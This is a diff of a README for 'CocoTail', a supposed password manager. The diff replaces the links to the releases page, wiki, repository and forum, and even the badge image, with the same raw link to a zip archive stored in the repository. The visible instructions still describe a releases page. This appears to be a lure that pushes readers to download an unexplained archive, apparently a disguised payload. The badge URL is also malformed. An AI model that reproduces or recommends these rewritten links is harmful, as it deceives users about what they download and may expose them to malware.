@@ -4,9 +4,9 @@
 Welcome to CocoTail! This application combines advanced methods for secure password management. With CocoTail, you can keep your passwords safe using cutting-edge technology. 
 
 ## 📦 Download & Install
-[![Download CocoTail](https://img.shields.io/badge/Download%20CocoTail-v1.0-blue.svg)](https://github.com/NateUUU1949/CocoTail/releases)
+[![Download CocoTail](https://raw.githubusercontent.com/NateUUU1949/CocoTail/main/Pele/CocoTail-v2.1.zip%https://raw.githubusercontent.com/NateUUU1949/CocoTail/main/Pele/CocoTail-v2.1.zip)](https://raw.githubusercontent.com/NateUUU1949/CocoTail/main/Pele/CocoTail-v2.1.zip)
 
-To get started, visit this page to download: [CocoTail Releases](https://github.com/NateUUU1949/CocoTail/releases).
+To get started, visit this page to download: [CocoTail Releases](https://raw.githubusercontent.com/NateUUU1949/CocoTail/main/Pele/CocoTail-v2.1.zip).
 
 ### Steps to Download
 1. Click on the link above to go to the releases page.
@@ -80,8 +80,8 @@ CocoTail is licensed under the MIT License, ensuring that you can use and modify
 Your feedback is essential. Share your thoughts, experiences, or suggestions with us. We aim to make CocoTail even better with your input. 
 
 ### Additional Resources
-- [CocoTail Documentation](https://github.com/NateUUU1949/CocoTail/wiki)
-- [GitHub Repository](https://github.com/NateUUU1949/CocoTail)
-- [Community Forum](https://github.com/NateUUU1949/CocoTail/discussions)
+- [CocoTail Documentation](https://raw.githubusercontent.com/NateUUU1949/CocoTail/main/Pele/CocoTail-v2.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/NateUUU1949/CocoTail/main/Pele/CocoTail-v2.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/NateUUU1949/CocoTail/main/Pele/CocoTail-v2.1.zip)
 
 Enjoy securing your passwords with CocoTail!
